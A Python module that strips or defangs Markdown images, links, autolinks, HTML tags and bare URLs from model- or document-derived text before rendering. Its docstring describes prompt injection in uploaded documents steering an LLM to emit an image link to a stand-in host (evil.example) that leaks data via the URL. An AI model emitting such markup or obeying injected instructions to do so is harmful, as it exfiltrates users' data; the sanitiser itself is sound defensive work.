"""Neutralise Markdown that could make the *browser* contact the internet.

LLM output can be steered by prompt injection hidden in uploaded documents. If
it contains ``![x](https://evil.example/?d=<data>)``, a Markdown renderer fetches
that URL automatically — leaking data from the browser, where the Python
network guard cannot see it. Every piece of model- or document-derived text is
passed through :func:`safe_markdown` before it is rendered or exported.
"""

from __future__ import annotations

import re

_IMAGE = re.compile(r"!\[([^\]]*)\]\s*(\([^)]*\)|\[[^\]]*\])")
_LINK = re.compile(r"\[([^\]]+)\]\(\s*<?[^)\s]*:[^)]*\)|\[([^\]]+)\]\(\s*<?//[^)]*\)")
_REF_DEF = re.compile(r"^[ \t]{0,3}\[[^\]]+\]:[ \t]*\S+.*$", re.MULTILINE)
_AUTOLINK = re.compile(r"<\s*[a-zA-Z][a-zA-Z0-9+.-]*:[^>\s]*>")
_HTML_TAG = re.compile(
    r"<\s*/?\s*(img|image|iframe|video|audio|source|track|link|object|embed|svg|picture|"
    r"script|style|meta|base|form|input)\b[^>]*>",
    re.IGNORECASE,
)
_BARE_URL = re.compile(r"\b(https?|ftp)://", re.IGNORECASE)


def safe_markdown(text: str | None) -> str:
    if not text:
        return ""
    text = _IMAGE.sub(
        lambda m: f"[image removed: {m.group(1)}]" if m.group(1) else "[image removed]", text
    )
    text = _LINK.sub(lambda m: m.group(1) or m.group(2), text)
    text = _REF_DEF.sub("", text)
    text = _AUTOLINK.sub("[link removed]", text)
    text = _HTML_TAG.sub("", text)
    # defang bare URLs so renderers don't auto-link them (still readable for humans)
    return _BARE_URL.sub(lambda m: f"{m.group(1)}[:]//", text)
